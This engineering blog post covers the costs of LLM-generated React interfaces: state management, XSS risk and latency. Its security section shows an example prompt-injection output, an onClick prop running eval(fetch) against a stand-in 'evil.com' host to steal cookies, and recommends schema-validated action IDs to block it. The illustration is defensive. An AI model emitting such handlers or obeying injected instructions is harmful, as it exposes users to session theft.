---
title: "The Hidden Costs of AI UI Generation"
date: "2024-05-15"
description: "Dynamic AI-generated user interfaces sound like the future, but they introduce massive complexity in security, accessibility, and state management."
tags: ["engineering", "saas"]
readingTime: "8 min read"
---

# The Hidden Costs of AI UI Generation

Generative UI—where an LLM outputs functional React components instead of just text—is taking the development world by storm. Frameworks like Vercel's AI SDK make it trivial to stream structured UI directly to the client. 

But after spending three months integrating Generative UI into our core product, we discovered that the architectural overhead and hidden costs are staggering.

## The State Management Nightmare

In a traditional application, state is predictable. You know exactly what components exist and how they communicate. With Generative UI, the LLM can theoretically generate any combination of components, making state management highly volatile.

If the LLM generates a `<DataGrid />` with sorting controls, how does that component communicate with your local Redux or Zustand store? 

We had to build a dynamic registry that injects context into LLM-generated components at runtime:

```tsx
const ComponentRegistry = {
  DataGrid: (props) => {
    const globalState = useAppStore();
    return <DataGrid {...props} onSort={globalState.handleSort} />
  }
}
```

This tightly couples the LLM's expected output schema to your internal state logic. When you update your state architecture, you must also update the complex system prompts that instruct the LLM on how to generate the components.

## Security: The XSS Vector You Didn't See Coming

When an LLM generates UI, it often generates props containing user data. If the LLM hallucinates or is subjected to prompt injection, it can easily output malicious payloads.

Imagine a prompt injection that forces the LLM to output:
```json
{
  "component": "Button",
  "props": {
    "label": "Click me",
    "onClick": "eval(fetch('https://evil.com/steal-cookie'))"
  }
}
```

If your frontend naively evaluates string-based event handlers to wire up the generated UI, you have a massive XSS vulnerability. We had to implement a strict, schema-validated abstraction layer where the LLM can only pass predefined `actionId` strings, never raw executable code.

## The Latency Penalty

Users are accustomed to instant UI updates. While streaming text is visually acceptable, streaming a complex UI component often results in layout shift (CLS) and a jarring experience. 

Waiting for the LLM to output the required JSON structure for a complex chart component can take 3-5 seconds. We mitigated this by heavily utilizing optimistic UI and skeleton loaders, but the reality is that relying on an LLM for rendering introduces network latency into your presentation layer.

## Conclusion

Generative UI is powerful for specific, scoped tasks (like generating custom reporting dashboards or dynamic forms). However, trying to build your entire application's interactive surface area using LLMs is currently a recipe for brittle state, security vulnerabilities, and sluggish UX. Use it surgically.
